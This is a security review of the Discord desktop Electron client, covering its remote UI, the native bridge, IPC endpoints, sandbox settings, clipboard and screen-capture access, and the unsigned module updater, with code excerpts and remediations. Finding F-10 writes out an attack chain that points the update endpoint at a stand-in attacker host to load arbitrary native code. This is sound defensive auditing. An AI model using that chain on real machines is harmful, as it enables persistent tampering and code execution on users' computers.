1 · Executive summary

Discord desktop is a hardened browser shell around the Discord website. It ships almost no product logic of its own. What it ships instead is a carefully fenced set of operating-system capabilities that the website is allowed to reach through one named bridge.

Nine findings matter most:

  1. The UI is remote. The main window loads https://discord.com/app over the network (app/mainScreen.js:72,108,109). Chat, voice UI, servers, settings screens — none of it is in either shipped archive.
  2. Two archives, two tiers. app.asar inside the .app bundle is only a launcher (39 source files: splash screen, updater, connectivity tests). The real shell is core.asar, downloaded separately into ~/Library/Application Support/discord/0.0.380/. The shell therefore self-updates independently of the macOS app bundle.
  3. The bridge is one object with 30 keys. contextBridge.exposeInMainWorld('DiscordNative', …) at app/mainScreenPreload.js:68, built from 26 distinct capability modules.
  4. 136 privileged IPC endpoints are registered in the main process, drawn from a canonical enum of 144 channel names in @discordapp/discord-native-types/IPCEvents.js.
  5. Two real allow-lists exist. app/discord_native/renderer/ipc.js:9-10 restricts the generic IPC facade to 25 sendable and 13 invokable channels, throwing 'cannot send this event' otherwise. This is a genuine, confirmed control — and it is also narrower than the attack surface, because the typed capability modules bypass that facade entirely (§8.3).
  6. Context isolation is on; the sandbox is off. contextIsolation:true, nodeIntegration:false, but sandbox:false (app/mainScreen.js:352-356). The preload therefore holds full Node — and renderer/fileManager.js (24.7 KB) does real fs I/O inside the renderer process rather than over IPC. This single setting defines the client's security posture.
  7. Permissions are deny-by-default with origin checks (mainScreen.js:388-428), and off-origin navigation is blocked (:526-530) — except during a Google OAuth flow, where the restriction is deliberately lifted (§8.6).
  8. Module updates carry no JavaScript-level signature check. The legacy path trusts HTTP 200 and TLS (common/moduleUpdater.js:572-605), then extracts with yauzl. Path traversal is blocked — but by the library, not by Discord's code (§8.8). The new updater is compiled Rust and is outside this analysis.
  9. Crash reports from modded clients are filtered out. common/crashReporterSetup.js:70-71 ignores errors mentioning BetterDiscord and VencordPatcher and denies the betterdiscord:// URL scheme.

What this report deliberately does not claim

  • That the app downloads all of its code on every launch. It does not: only shadercache and the code caches are cleared at window creation (mainScreen.js:379-383). Chromium's HTTP cache is left intact, so subresources are served from disk on subsequent launches. Only the document URL is cache-busted, via ?_=${Date.now()} at mainScreen.js:90.
  • That any capability observed in code is actually exercised. No runtime tracing was done.
  • That a third-party host receives user data because its URL appears in source. §9 separates "URL present" from "request observed" (which is: none).
  • That riotGames implies a commercial partnership. The code reads Riot's publicly documented Live Client Data API on 127.0.0.1:2999 — no business relationship is required or evidenced.

2.1 The two-archive design, and why it exists

What we found. The installed .app bundle contains an app.asar whose only job is to bootstrap. Its Constants.js resolves endpoints and settings, its splashScreen.js shows the loading window, and moduleUpdater fetches everything else. The shell that actually hosts Discord — core.asar — lives in the user's data directory under a version folder.

Evidence.

/Applications/Discord.app/Contents/Resources/app.asar
  app_bootstrap/   39 source files   ← launcher, splash, updater, connectivity tests
  common/          16 source files   ← shared library (byte-identical set to core.asar's)
  node_modules/  1020 files

~/Library/Application Support/discord/0.0.380/modules/
  discord_desktop_core/core.asar   9.2 MB  ← THE SHELL (2159 entries, 2032 JS files)
  discord_voice/                    81 MB  ← compiled
  discord_krisp/                     52 MB  ← compiled
  …13 further native modules

What it means in simple English. Installing Discord installs a downloader. The downloader fetches the real program into your home folder. That is why Discord can update itself without ever asking for an administrator password, and why the copy in /Applications barely changes.

Why it matters. It moves the real code out of a code-signed, root-owned bundle into a user-writable directory. Any process already running as your user can modify core.asar on disk. That is precisely how client mods such as BetterDiscord and Vencord operate — and it explains why crashReporterSetup.js has to filter their crash reports out (§8.11).

Confidence Confirmed — both archives inspected directly; file counts enumerated from the ASAR index.

3.2 The native bridge — app/discord_native/

Three parallel directories, and the split is the architecture:

  • browser/ — 24 modules that run in the main process and register IPC handlers.
  • renderer/ — 26 modules that run in the preload and call them (or skip IPC entirely).
  • common/ — 4 shared modules: constants.js (the DISCORD_ prefixer), DiscordIPC.js (the main/renderer transport classes), paths.js, fileutils.js.

Most pairs are symmetric, which makes the whole bridge mechanically legible: for a capability X, read renderer/X.js for the API the website sees and browser/X.js for what the main process will actually do. Three modules break the symmetry, and those are the interesting ones:

What we found. Three synchronous handlers — IS_ENCRYPTION_AVAILABLE, ENCRYPT_STRING, DECRYPT_STRING — expose the OS keychain as a general-purpose encrypt/decrypt oracle to whatever is running in the renderer.

Evidence.

// app/discord_native/browser/safeStorage.js:15-21
electron.ipcMain.on(SAFE_STORAGE_ENCRYPT_STRING, (event, plainText) => {
  if (plainText) {
    event.returnValue = electron.safeStorage.encryptString(plainText).toString('base64');
  } else { event.returnValue = null; }
});

What it means in simple English. The website can hand the app any text and get it back encrypted with a key held in your Mac's keychain — and hand back ciphertext to get the original. There is no check on who is asking. The handler never looks at event.senderFrame.

Why it matters. It is an entirely reasonable design given the assumption that the renderer only ever runs Discord's own code. It is also the thing that converts a cross-site scripting bug on discord.com — or a client mod, or a malicious browser-style injection — from "can read the page" into "can decrypt everything the client ever stored." Encryption at rest protects against someone copying files off the disk; it does not protect against code running inside the renderer, and this design makes that explicit.

Confidence Confirmed — call sites on both sides read in full; no validation code exists in either file.

The asymmetry is the finding. The require side validates the module name:

// app/discord_native/renderer/nativeModules.js:40-45
function requireModule(name) {
  if (!/^discord_[a-z0-9_-]+$/.test(name) && name !== 'erlpack') {
    throw new Error('"' + String(name) + '" is not a whitelisted native module');
  }
  return require(name);
}

The install side does not. NATIVE_MODULES_INSTALL passes the renderer-supplied name straight into the updater. Whether that is exploitable depends entirely on how the updater builds its URL and target path — and on the legacy path it is URL-encoded (moduleUpdater.js:572: encodeURIComponent(getRemoteModuleName(…))), which blocks path escape in the request. The destination directory is path.join(moduleInstallPath, queuedModule.name) (:700), which is not encoded — so a name containing ../ would resolve outside the install root. It would still need the server to return a 200 with a zip. Classified as potential, not confirmed (§14, F-3).

A compact flow that shows the defensive pattern used throughout:

user clicks link in chat

6.2 Clipboard — bidirectional, preload-resident

What we found. Clipboard reading does not use IPC at all. It happens in the preload, directly:

// app/discord_native/renderer/clipboard.js:43-45
function read() {
  return _electron.default.clipboard.readText();
}

Writing is likewise direct (:13, :21-24, :29-34), including a platform-specific file-URL write for macOS. Only cut/paste/empty-copy go over IPC, and those merely trigger the focused webContents' own edit command (browser/clipboard.js:11-21) — they do not read data.

Why it matters. DiscordNative.clipboard.read() returns your entire clipboard text to whatever called it, with no prompt and no origin check, because it never crosses a boundary where a check could be applied. hasMixedContent() (:46-52) additionally enumerates all available clipboard formats. There is a legitimate reason (pasting images into chat); the capability is nonetheless unconditional.

Confidence Confirmed capability · Unknown whether called outside a user paste gesture — that logic is in the remote bundle.

6.3 Screen contents — thumbnails of every window

// app/discord_native/browser/desktopCapturer.js:15-26
DiscordIPC.main.handle(IPCEvents.DESKTOP_CAPTURER_GET_SOURCES, async (_, opts) => {
  const sources = await electron.desktopCapturer.getSources(electronOptions);
  return sources.map(source => ({
    id: source.id,
    name: source.name,                      // ← window titles of every open app
    url: source.thumbnail.toDataURL(),      // ← a rendered PNG of each one
    icon: source.appIcon?.toDataURL()
  }));
});

What it means in simple English. One IPC call returns a list of every screen and window on your machine, each with its title and a small picture of its current contents. That is how the "choose what to share" picker is populated — but the data crosses into the renderer before you choose anything, and the handler has no sender check.

Why it matters. Window titles alone are sensitive (document names, bank tabs, private message windows). The thumbnails more so. On macOS this is partly mitigated by the OS-level Screen Recording permission, which Discord must already hold — but once held, it applies to every call, not per-call.

Confidence Confirmed capability · Tentative on impact — macOS TCC gating not verified at runtime.

6.4 Files — preload-resident, unrestricted

renderer/fileManager.js imports fs, node:fs/promises, node:crypto, node:stream, node-downloader-helper and @openpgp/unbzip2-stream (:63-80) and performs direct reads, writes, unlink, readdir and mkdir throughout (verified at :123, 223-248, 431-439, 484, 543-554, 592-611).

F-1 · sandbox:false — the decision that shapes everything else

Found The renderer is sandbox-disabled, so its preload script runs with full Node.js privileges in the same process as remote web content.

Evidence app/mainScreen.js:353. Corroborated by what the preload actually does: renderer/fileManager.js:64-69 imports fs and node:crypto; renderer/clipboard.js:44 calls clipboard.readText(); renderer/riotGames.js:24 opens its own HTTPS socket.

Chain mainScreen.js:353 → :354 preload path → mainScreenPreload.js:22-48 requires 26 modules → each holds direct Node APIs → :68 exposes a façade over them to remote content.

Simple English Context isolation keeps the website's JavaScript in its own sealed room, so it can't grab Node directly. But the room next door — the preload — has the keys to the whole house, and it hands the website a menu of things it will do on request. The wall is real; the serving hatch is wide.

Why it matters With sandbox:true, a renderer-process compromise (a Chromium RCE, say) is contained by the OS sandbox. With sandbox:false, the preload's Node capabilities are in the same process as the attacker. This single flag converts "browser bug" into "code execution as your user."

Classification Design property — almost certainly deliberate: the file, clipboard and native-module features as written cannot work under a sandbox. It is a documented Electron trade-off, not a mistake. It is also the highest-leverage change available to Discord.

Remediation Move fs, clipboard and https work out of the preload into main-process handlers, then enable sandbox:true. Large change; the IPC vocabulary already exists for most of it.

Next step Enumerate at runtime which DiscordNative members the web bundle actually calls, to size the migration.

F-6 · While insideAuthFlow is true, the origin fence is fully open

Found A single boolean suspends the navigation restriction. It is set when a redirect goes from discord.com to accounts.google.com, and cleared only when the web app signals APP_ASYNC_INDEX_TSX_LOADED and the current URL is back on WEBAPP_ENDPOINT (:482-484).

Simple English To let you sign in with Google, the app temporarily stops checking which websites it is allowed to visit. The "all clear" is a flag flipped on one specific redirect, and it stays flipped until the web app reports it is home again.

9.1 The age-verification entries — what the evidence does and does not support

What we found. Three origins belonging to k-id and to a Swiss company, privately.swiss, in a constant named AllowedMediaOrigins — and they are the only origins granted the media (camera/microphone) permission in setPermissionRequestHandler (mainScreen.js:407-409).

9.3 The HTTP stack

app_bootstrap/request.js tries Electron's net.request first — using session.defaultSession, so it inherits Chromium's proxy and cert handling — and silently falls back to the request npm library on any failure (:183-189). The fallback uses the bundled cacert.pem rather than the system trust store (app/rootCertificates.js:16). Both paths set followAllRedirects/redirect:'follow' (:114, :140), and electronRequest auto-answers HTTP auth challenges with an empty callback (:160).

Why it matters. Two stacks with two trust stores and two redirect handlers, chosen by try/catch, is a recipe for divergent security behaviour. If the Electron path fails for a reason related to certificate validation, the fallback re-attempts with a different trust configuration. That is worth a closer look than this pass gave it.

Classification Unknown — flagged, not assessed.

9.4 Riot Games — correcting a tempting inference

A dedicated riotGames bridge member and a bundled riotgames.pem look like evidence of a partnership. They are not. renderer/riotGames.js performs a plain GET against https://127.0.0.1:2999/liveclientdata/ — Riot's publicly documented Live Client Data API, served by the League of Legends client on the user's own machine with a self-signed certificate. The bundled PEM exists because that certificate is not in any public trust store, so it must be pinned explicitly (:20-25). This is how Rich Presence reads your current match. No business relationship is required, and none is evidenced.

Confidence Confirmed — the request is local-only; ca: riotRootCA is passed explicitly.

F-10 · Security-critical configuration lives in an unsigned, user-writable JSON file

Chain Write {"API_ENDPOINT":"https://attacker.test/api"} to settings.json → app_bootstrap/Constants.js:24-25 adopts it as UPDATE_ENDPOINT → moduleUpdater.js:243 builds remoteBaseURL from it → :572-605 downloads a zip and accepts it on HTTP 200 with no signature check (F-7) → :702-764 extracts into module_data/ → renderer/nativeModules.js:44 require()s it as native code.

Simple English Edit one line in a text file in your own home folder, and Discord will download its program from somewhere else and run it.

Why it matters The honest framing: this is not a privilege-escalation vulnerability. An attacker who can write that file already runs as you, and could simply edit core.asar directly (§2.1). It is a persistence and tamper surface — it converts one quiet file write into durable control over the app's code source, surviving reinstalls of the .app bundle. It is also exactly the mechanism legitimate client mods use.

Classification Design property with real abuse potential. Not exploitable from the renderer — SETTINGS_SET (browser/settings.js:28) writes to a different store, the injected appSettings, and the keys above are read at launcher time before the renderer exists.

Remediation Sign or HMAC the settings file; or hard-pin UPDATE_ENDPOINT at build time and ignore any override on stable channels. The second is cheap and closes the chain.

Next step Confirm in an isolated VM that a modified API_ENDPOINT is honoured on a stable build. Not performed.

Overall assessment

This is a better-than-average Electron client. Context isolation is on, Node integration is off, permissions are deny-by-default with real origin checks, window creation is explicitly denied by default, and the IPC vocabulary is centralised and namespaced. Someone thought about this — the 'You tried.' error message and the nine-entry protocol deny-list are both fingerprints of real adversarial review.

Its weaknesses are coherent rather than careless, and they trace to two decisions: keeping Node in the preload (F-1), which removes the sandbox as a backstop, and trusting the renderer wholesale (F-4) rather than per-handler, which means the perimeter controls in §8.2 and §8.6 have nothing behind them. The single highest-leverage fix is not either of those: it is adding a sender check inside DiscordIPC, which would retrofit defence in depth onto all 136 endpoints at once.

The largest unknown is update verification (F-7). On macOS the legacy, unsigned path is the default, and the modern path's integrity logic is in compiled Rust that this analysis could not read. Until that is decompiled, the question "can Discord's update channel install arbitrary native code" has no evidence-backed answer.
